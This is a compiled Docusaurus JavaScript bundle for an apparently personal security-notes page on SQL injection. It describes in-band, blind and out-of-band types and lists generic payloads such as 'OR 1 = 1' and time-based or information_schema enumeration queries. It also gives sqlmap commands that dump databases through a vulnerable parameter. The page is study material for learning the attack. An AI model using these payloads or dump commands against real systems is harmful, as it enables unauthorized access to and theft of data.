"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[8720],{3905:(e,t,a)=>{a.d(t,{Zo:()=>c,kt:()=>b});var n=a(7294);function s(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function l(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function r(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?l(Object(a),!0).forEach((function(t){s(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):l(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function o(e,t){if(null==e)return{};var a,n,s=function(e,t){if(null==e)return{};var a,n,s={},l=Object.keys(e);for(n=0;n<l.length;n++)a=l[n],t.indexOf(a)>=0||(s[a]=e[a]);return s}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(n=0;n<l.length;n++)a=l[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(s[a]=e[a])}return s}var i=n.createContext({}),u=function(e){var t=n.useContext(i),a=t;return e&&(a="function"==typeof e?e(t):r(r({},t),e)),a},c=function(e){var t=u(e.components);return n.createElement(i.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},m=n.forwardRef((function(e,t){var a=e.components,s=e.mdxType,l=e.originalType,i=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),p=u(a),m=s,b=p["".concat(i,".").concat(m)]||p[m]||d[m]||l;return a?n.createElement(b,r(r({ref:t},c),{},{components:a})):n.createElement(b,r({ref:t},c))}));function b(e,t){var a=arguments,s=t&&t.mdxType;if("string"==typeof e||s){var l=a.length,r=new Array(l);r[0]=m;var o={};for(var i in t)hasOwnProperty.call(t,i)&&(o[i]=t[i]);o.originalType=e,o[p]="string"==typeof e?e:s,r[1]=o;for(var u=2;u<l;u++)r[u]=a[u];return n.createElement.apply(null,r)}return n.createElement.apply(null,a)}m.displayName="MDXCreateElement"},5218:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>i,contentTitle:()=>r,default:()=>h,frontMatter:()=>l,metadata:()=>o,toc:()=>u});var n=a(7462),s=(a(7294),a(3905));const l={},r="\ud83d\udc89 SQLi",o={unversionedId:"security/web/sql-injection",id:"security/web/sql-injection",title:"\ud83d\udc89 SQLi",description:"SQL injections (SQLi) is a type of vulnerability that allows the execution of malicious queries.",source:"@site/docs/security/05-web/sql-injection.md",sourceDirName:"security/05-web",slug:"/security/web/sql-injection",permalink:"/docs/security/web/sql-injection",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/05-web/sql-injection.md",tags:[],version:"current",frontMatter:{},sidebar:"securitySidebar",previous:{title:"\ud83d\udce9 Serialization",permalink:"/docs/security/web/serialization"},next:{title:"\ud83d\udd28 SSRF",permalink:"/docs/security/web/ssrf"}},i={},u=[{value:"In-Band SQL Injection",id:"in-band-sql-injection",level:2},{value:"Blind SQLi",id:"blind-sqli",level:2},{value:"Out-of-band SQLi",id:"out-of-band-sqli",level:2},{value:"Warnings",id:"warnings",level:2},{value:"SQL is not case sensitive",id:"sql-is-not-case-sensitive",level:3},{value:"Comments",id:"comments",level:3},{value:"Quotes",id:"quotes",level:3},{value:"sqlmap",id:"sqlmap",level:2},{value:"sqlmap over websockets",id:"sqlmap-over-websockets",level:3}],c=e=>function(t){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),(0,s.kt)("div",t)},p=c("Image"),d=c("Gist"),m={toc:u},b="wrapper";function h(e){let{components:t,...l}=e;return(0,s.kt)(b,(0,n.Z)({},m,l,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"-sqli"},"\ud83d\udc89 SQLi"),(0,s.kt)("p",null,"SQL injections (SQLi) is a type of vulnerability that allows the execution of malicious queries."),(0,s.kt)("p",null,"Types of SQLi:"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"In-Band SQLi"),(0,s.kt)("li",{parentName:"ul"},"Blind SQLi"),(0,s.kt)("li",{parentName:"ul"},"Out-of-band SQLi")),(0,s.kt)("h2",{id:"in-band-sql-injection"},"In-Band SQL Injection"),(0,s.kt)("p",null,"In-band SQLi are based on the output of the query that is showed directly to the user."),(0,s.kt)("p",null,"This attack allows to extract easily a lot of data from the database."),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Union based: the attacker uses the UNION operator to read data from additional tables."),(0,s.kt)("li",{parentName:"ul"},"Error based: the server returns the database errors allowing an easier interaction for the attacker.")),(0,s.kt)("p",null,"Common payloads"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-sql"},"OR 1 = 1; --\nUNION 1,2,3; --\n")),(0,s.kt)("h2",{id:"blind-sqli"},"Blind SQLi"),(0,s.kt)("p",null,"In blind SQLi no direct feedbacks are returned from the server."),(0,s.kt)("p",null,"There are different ways to make a blind SQLi:"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Authentication bypass: the output is not needed because the goal is to bypass a login form."),(0,s.kt)("li",{parentName:"ul"},"Boolean based: the server replies only with a boolean."),(0,s.kt)("li",{parentName:"ul"},"Time based: based on the sleep function and the time needed by the query to complete.")),(0,s.kt)("p",null,"Common payloads"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-sql"},"UNION SELECT SLEEP(5);--\nWHERE database() LIKE 'a%'\nFROM information_schema.tables WHERE table_schema = 'DATABASE_NAME' and table_name like 'a%';\nFROM information_schema.columns WHERE table_schema='DATABASE_NAME' and table_name='DATABASE_TABLE' and column_name like 'a%';\n")),(0,s.kt)("p",null,"Enumeratation example"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-sql"},"WHERE database() LIKE 'a%'\nWHERE database() LIKE 'b%'\nWHERE database() LIKE 'c%'\nWHERE database() LIKE 'd%'\n\nWHERE database() LIKE 'da%'\nWHERE database() LIKE 'db%'\n\nWHERE database() LIKE 'dba%'\nWHERE database() LIKE 'dbb%'\n...\n")),(0,s.kt)("h2",{id:"out-of-band-sqli"},"Out-of-band SQLi"),(0,s.kt)("p",null,"Out-Of-Band attacks are based on two different channels: one for the injection and the other to check the output."),(0,s.kt)("h2",{id:"warnings"},"Warnings"),(0,s.kt)("admonition",{type:"caution"},(0,s.kt)("p",{parentName:"admonition"},"This is a list of few important warnings about SQL queries and SQLi.")),(0,s.kt)("h3",{id:"sql-is-not-case-sensitive"},"SQL is not case sensitive"),(0,s.kt)("p",null,"SQL clauses and schema values are not case sensitive."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-sql"},"-- all equals\nSELECT * FROM USERS WHERE USERNAME='admin';\nselect * from users where username='admin';\nSelect * From Users Where Username='admin';\nSeLeCt * FrOm UsErs WhErE UsErNaMe='admin';\n")),(0,s.kt)("h3",{id:"comments"},"Comments"),(0,s.kt)("p",null,"A single space after the double slash could be needed.\nFor example, in MySQL is mandatory."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-sql"},"; -- this is a comment\n; --this could not be a comment\n")),(0,s.kt)("h3",{id:"quotes"},"Quotes"),(0,s.kt)("p",null,"Single quotes are not always interchangeable with double quotes.\nFor example, PostgreSQL allows only single quotes for values and double quotes for schema names."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-sql"},'select "column" from "table" where "column"=\'value\';\n')),(0,s.kt)("h2",{id:"sqlmap"},"sqlmap"),(0,s.kt)(p,{src:a(3280).Z,mdxType:"Image"}),(0,s.kt)("p",null,"Use ",(0,s.kt)("inlineCode",{parentName:"p"},"-u")," to define the target url and ",(0,s.kt)("inlineCode",{parentName:"p"},"--batch")," to use the default behavior without asking for input."),(0,s.kt)("p",null,"In the next commands, ",(0,s.kt)("inlineCode",{parentName:"p"},"id")," is a query parameter that is vulnerable to SQL injection."),(0,s.kt)("p",null,"Enumerate databases."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},'sqlmap -u "http://website.com/?id=1" --batch --dbs\n')),(0,s.kt)("p",null,"Enumerate tables of a specific database."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},'sqlmap -u "http://website.com/?id=1" --batch --tables -D db_name\n')),(0,s.kt)("p",null,"Enumerate tables content of a specific database."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},'sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name\n')),(0,s.kt)("p",null,"Enumerate content by specifing table, column, and database."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},'sqlmap -u "http://website.com/?id=1" --batch --dump -D db_name -T table_name -C col_name\n')),(0,s.kt)("h3",{id:"sqlmap-over-websockets"},"sqlmap over websockets"),(0,s.kt)("p",null,"sqlmap may not support all types of requests, including those made over websockets. Also, working with complex targets can sometimes be cumbersome using sqlmap alone."),(0,s.kt)("p",null,"To simplify the process, it is possible to set up a fake server as an intermediary. In this way, sqlmap would make a request to the fake server using a common format, and the fake server would then make the more complex request to the actual target."),(0,s.kt)(p,{src:a(5555).Z,mdxType:"Image"}),(0,s.kt)(d,{id:"4adec402e51df2bf3e35066172abaebf",mdxType:"Gist"}))}h.isMDXComponent=!0},3280:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/sqlmap-19ab36f4fcb837c1a823a44ad989cd4f.png"},5555:(e,t,a)=>{a.d(t,{Z:()=>n});const n=a.p+"assets/images/sqlmap_over_websockets-001b1de5593b04c3c09f79857073d13a.png"}}]);